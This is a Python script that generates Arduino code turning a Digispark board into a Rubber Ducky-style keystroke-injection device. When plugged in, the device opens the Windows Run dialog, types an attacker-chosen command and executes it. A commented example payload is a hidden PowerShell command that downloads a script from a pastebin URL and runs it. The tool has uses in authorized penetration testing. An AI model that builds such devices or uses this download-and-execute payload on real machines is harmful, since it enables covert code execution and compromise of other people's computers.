#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This script generates the INO code to make your own Rubber Ducky with a Digispark
#    Copyright (C) 2024  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

from os import makedirs
from os.path import join
from sys import argv, exit, stderr

if len(argv) != 3 or (argv[1] != "fr" and argv[1] != "us"):
    print("USAGES: python DigisparkRubberDuckyExecuteCommand.py <lang: fr|us> <command>", file=stderr)
    exit(1)

# lang = "us"
# lang = "fr"
lang = argv[1]

keyboard = {}
with open(f"{lang}_keyboard.h") as file:
    for line in file:
        _, key, *values = line.split()
        if len(values) == 1:
            values.append("0x00")
        keyboard[key] = [x.strip(", ") for x in values]
    file.seek(0)
    data = file.read()

# payload = '''powershell -windowstyle hidden -Command "iex(iwr -Uri 'https://pastebin.com/raw/bcjhnYKG' -UseBasicParsing).Content"'''
payload = argv[2]

makedirs("DigisparkRubberDucky", exist_ok=True)

with open(join("DigisparkRubberDucky", "DigisparkRubberDucky.ino"), "w") as file:
    file.write("""
#include "DigiKeyboard.h"

// https://learn.microsoft.com/en-us/windows/win32/inputdev/about-keyboard-input
""" + data + """
#define PAYLOAD_LENGTH """ + str(len(payload) * 2) + """
const PROGMEM uint8_t payload [PAYLOAD_LENGTH] = {
    """ + ", ".join(
    ', '.join(
        keyboard[f"ASCII_{ord(x):0>2X}" if ord(x) < 0x80 else f"ISO_8859_1_{ord(x):0>2X}"]
    ) for x in payload
) + """
};

void setup() {
    pinMode(0, OUTPUT);
    pinMode(1, OUTPUT);

    digitalWrite(0, HIGH);
    digitalWrite(1, HIGH);

    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(500);
    DigiKeyboard.sendKeyStroke(21, MOD_GUI_LEFT);
    DigiKeyboard.delay(500);

    for (int index = 0; index < PAYLOAD_LENGTH; index += 2) {
        uint8_t key = pgm_read_word_near(payload + index);
        uint8_t mod = pgm_read_word_near(payload + index + 1);
        if (key == 0) {
            DigiKeyboard.delay(mod);
        } else {
            DigiKeyboard.sendKeyStroke(key,mod);
        }
    }

    DigiKeyboard.sendKeyStroke(KEY_ENTER);

    digitalWrite(0, LOW);
    digitalWrite(1, LOW);
}

void loop() {}""")
